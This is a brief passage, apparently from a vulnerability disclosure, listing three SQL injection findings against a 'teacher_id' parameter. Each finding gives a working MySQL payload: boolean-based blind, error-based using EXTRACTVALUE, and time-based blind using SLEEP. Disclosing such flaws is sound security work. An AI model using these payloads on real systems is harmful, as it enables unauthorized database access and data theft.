...
- **Type:** boolean-based blind
  ...
  - **Payload:** `teacher_id=1' RLIKE (SELECT (CASE WHEN (3490=3490) THEN 1 ELSE 0x28 END)) AND 'lNso'='lNso`
- **Type:** error-based
  - **Title:** MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
  - **Payload:** `teacher_id=1' AND EXTRACTVALUE(7132,CONCAT(0x5c,0x71786a6a71,(SELECT (ELT(7132=7132,1))),0x7178767071)) AND 'ezLu'='ezLu`
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `teacher_id=1' AND (SELECT 1763 FROM (SELECT(SLEEP(5)))rAst) AND 'Wrrn'='Wrrn`
